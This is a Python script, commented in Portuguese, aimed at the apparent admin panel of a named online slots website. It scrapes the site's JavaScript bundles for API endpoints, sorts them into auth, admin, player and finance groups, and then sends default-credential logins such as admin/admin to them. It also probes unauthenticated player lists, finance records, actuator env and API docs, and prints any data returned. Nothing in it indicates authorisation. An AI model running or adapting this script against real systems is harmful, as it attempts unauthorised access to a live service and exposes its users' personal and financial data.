"""Baixa e analisa os bundles JS do pa.rainha777slots.com"""
import urllib.request, urllib.error, ssl, re, json, os, time
from collections import defaultdict

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

PA_HOST = "pa.rainha777slots.com"
BASE    = f"https://{PA_HOST}"

def fetch(url, timeout=15):
    try:
        r = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

# ─── PASSO 1: pegar o index.html do PA ───────────────────────────

print("Baixando index.html do PA...")
st, html = fetch(BASE + "/")
print(f"  HTTP={st} len={len(html)}")
print(f"  Título: {re.search(r'<title>(.*?)</title>', html).group(1) if re.search(r'<title>(.*?)</title>', html) else '?'}")

# Extrair scripts/css referenciados
scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
css     = re.findall(r'href=["\']([^"\']+\.css)["\']', html)
print(f"\n  Scripts: {len(scripts)}")
for s in scripts:
    print(f"    {s}")

# ─── PASSO 2: baixar os bundles JS ───────────────────────────────

os.makedirs("pa_bundles", exist_ok=True)
all_content = ""

for src in scripts:
    url = src if src.startswith("http") else BASE + src
    fname = "pa_bundles/" + src.replace("/","_").replace(":","_")[-60:]
    if os.path.exists(fname):
        with open(fname, encoding="utf-8", errors="ignore") as f:
            content = f.read()
        print(f"  [cache] {src} ({len(content)} chars)")
    else:
        st2, content = fetch(url)
        if st2 == 200 and content:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"  [baixou] {src} ({len(content)} chars)")
        else:
            print(f"  [ERRO {st2}] {src}")
            continue
        time.sleep(0.5)
    all_content += content + "\n"

if not all_content.strip():
    print("\nNenhum bundle baixado. Tentando caminhos alternativos...")
    for alt in ["/static/js/app.3bae0f2c.js",
                "/static/js/chunk-elementUI.js",
                "/js/app.js",
                "/js/main.js"]:
        st2, content = fetch(BASE + alt)
        if st2 == 200 and content.strip():
            print(f"  [ok] {alt} ({len(content)} chars)")
            all_content += content + "\n"
        time.sleep(0.3)

if not all_content.strip():
    print("Não foi possível baixar bundles do PA.")
    exit(0)

print(f"\n  Total conteúdo JS: {len(all_content)} chars")

# ─── PASSO 3: extrair endpoints ──────────────────────────────────

print("\n" + "=" * 60)
print("ENDPOINTS ENCONTRADOS")
print("=" * 60)

paths = set()
for m in re.finditer(r'["\']((/?(?:api|admin|manage|prod-api|japi)/[A-Za-z0-9/_\-\.]{3,80}))["\']', all_content):
    p = m.group(1)
    if not p.startswith("/"): p = "/" + p
    paths.add(p)

# Também busca strings URL completas
for m in re.finditer(r'["\`]([^\"\`\n]{5,120}(?:api|admin|login|manage|player|finance)[^\"\`\n]{0,80})["\`]', all_content):
    v = m.group(1)
    if "/" in v and any(k in v for k in ("api/","admin/","login","manage","player","finance")):
        paths.add(v[:100])

cats = defaultdict(list)
for p in sorted(paths):
    pl = p.lower()
    if any(k in pl for k in ("login","sign","auth","token","password","otp")):
        cats["auth"].append(p)
    elif any(k in pl for k in ("admin","manage","super","staff","operator","panel","dashboard")):
        cats["admin"].append(p)
    elif any(k in pl for k in ("player","user","account","profile")):
        cats["player"].append(p)
    elif any(k in pl for k in ("finance","recharge","withdraw","pay","fund","balance","transaction")):
        cats["finance"].append(p)
    elif any(k in pl for k in ("config","set","setting","system")):
        cats["config"].append(p)
    else:
        cats["other"].append(p)

for cat, ps in sorted(cats.items()):
    if ps:
        print(f"\n--- {cat} ({len(ps)}) ---")
        for p in sorted(set(ps))[:30]:
            print(f"  {p}")

print(f"\nTotal paths: {len(paths)}")

with open("pa_endpoints.json","w",encoding="utf-8") as f:
    json.dump({"total": len(paths), "by_cat": dict(cats), "all": sorted(paths)},
              f, ensure_ascii=False, indent=2)
print("Salvo em pa_endpoints.json")

# ─── PASSO 4: testar alguns endpoints chave ──────────────────────

print("\n" + "=" * 60)
print("TESTANDO ENDPOINTS API DO PA")
print("=" * 60)

def api_call(method, path, body=None, token=None):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json",
         "Origin": BASE, "Referer": BASE + "/login"}
    if body is not None: h["Content-Type"] = "application/json"
    if token: h["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body else None
    url = BASE + path
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=8, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            try: return resp.status, json.loads(raw)
            except: return resp.status, {"_raw": raw[:300]}
    except urllib.error.HTTPError as e:
        raw = e.read(4096).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, json.loads(raw)
        except: return e.code, {"_raw": raw[:200]}
    except Exception as ex:
        return 0, {"err": str(ex)}

# Endpoints comuns de PA
pa_api_tests = [
    ("POST", "/api/login",        {"username":"admin","password":"admin"}),
    ("POST", "/api/login",        {"username":"admin","password":"123456"}),
    ("POST", "/api/admin/login",  {"username":"admin","password":"admin"}),
    ("POST", "/api/user/login",   {"username":"admin","password":"admin"}),
    ("POST", "/api/v1/login",     {"username":"admin","password":"admin"}),
    ("GET",  "/api/player/list",  None),
    ("GET",  "/api/admin/player/list", None),
    ("GET",  "/api/finance/list", None),
    ("GET",  "/api/system/info",  None),
    ("GET",  "/api/config",       None),
    ("GET",  "/actuator/health",  None),
    ("GET",  "/actuator/env",     None),
    ("GET",  "/v2/api-docs",      None),
    ("GET",  "/v3/api-docs",      None),
]

# Adicionar os paths descobertos no JS
for p in sorted(cats.get("auth",[]))[:10]:
    pa_api_tests.append(("POST", p, {"username":"admin","password":"admin"}))
for p in sorted(cats.get("admin",[]))[:10]:
    pa_api_tests.append(("GET", p, None))

for method, path, body in pa_api_tests:
    st, body_resp = api_call(method, path, body)
    code = body_resp.get("code") if isinstance(body_resp,dict) else None
    raw_hint = str(body_resp.get("_raw",""))[:100] if isinstance(body_resp,dict) else str(body_resp)[:100]
    msg  = str(body_resp.get("msg",""))[:50] if isinstance(body_resp,dict) else ""
    is_interesting = (
        st == 200 and code == 200 or
        (st == 200 and not body_resp.get("_raw")) or
        st == 401 or
        (st == 200 and "token" in str(body_resp).lower())
    )
    if is_interesting or code == 200:
        flag = " *** " if code == 200 or (st == 200 and body_resp.get("data")) else ""
        print(f"  [{method:5} {st}] {path:50} code={code} msg={msg!r}{flag}")
        if body_resp.get("data"):
            print(f"    DATA: {str(body_resp['data'])[:300]}")
    time.sleep(0.3)

print("\nConcluído.")
